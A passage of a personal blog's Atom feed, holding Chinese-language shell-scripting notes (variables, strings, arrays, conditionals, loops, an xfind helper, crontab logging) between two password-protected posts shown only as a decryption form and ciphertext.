    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-07-18T07:50:52.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><p>函数返回值只能输0-255数字，且用<code>$?</code>接收</p><pre><code class="shell">function test(){    read num    return  $num}testif [ $? -eq 1 ];then    echo &quot;yes&quot;else    echo &quot;no&quot;fi</code></pre><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p><a href="http://wangchujiang.com/linux-command/c/crontab.html" target="_blank" rel="external">http://wangchujiang.com/linux-command/c/crontab.html</a></p><p>默认日志路径:<code>/var/mail/Username</code></p><p>修改邮件接收地址：<code>MAILTO=939xxxx983@qq.com</code></p><p>日志重定向：<code>* * * * * command &gt;&gt; /Users/Samuel/Desktop/command.log 2&gt;&amp;1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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